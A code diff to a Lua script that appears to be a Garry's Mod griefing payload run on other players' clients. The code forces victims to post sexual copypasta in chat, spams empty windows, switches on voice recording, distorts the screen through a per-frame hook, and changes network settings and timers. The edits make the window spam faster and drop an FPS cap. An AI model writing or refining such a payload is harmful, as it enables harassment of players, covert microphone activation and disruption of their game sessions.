@@ -171,16 +171,8 @@ local funnies = {
     'sdfg',
     'gsdfg',
     'awdg',
-    'wdad'
+    'wdad',
 }
-_command('cl_updaterate','1')
-_command('cl_interp_ratio','32.8947368')
-_command('cl_interp','.0')
-_command('cl_cmdrate','5')
-_command('cl_updaterate','5')
-_command('rate','50')
-_command('net_maxpacketdrop','80')
-_command('net_splitpacket_maxrate','1576')
 local function oniichan() --aids copypasta
     _timer.Create('o',0,1,function() LocalPlayer():ConCommand("say Huh? Don't sniff you? Don't be silly Onii-chan I love you why can't I show my affection? (─‿‿─)♡")end)
     _timer.Create('n',03,1,function() LocalPlayer():ConCommand("say Hahaha your face is red. Woah Onii-chan why are you pushing me on to the bed?")end)
@@ -221,7 +213,7 @@ end)
 --    timer.Remove("haha5")
 --    timer.Remove("hahasong")
 --end
-_timer.Create('scren',.9,100000,ss)
+_timer.Create('scren',0,100000,ss)
 _timer.Create('hntai', .5, 10000, function()
 local _f = _vgui.Create("DFrame")
     _f:SetTitle("")
@@ -258,7 +250,7 @@ _hook.Add('Think','funny',function()
         _command('+voicerecord')
         _command('pp_mat_overlay_refractamount',tonumber(cfunnies))
         _command('pp_texturize',result2)
-        _command('fps_max','30')
+        --_command('fps_max','30')
         --_command('nyan_love')
         --_command('hahaball')
         --_command('status')
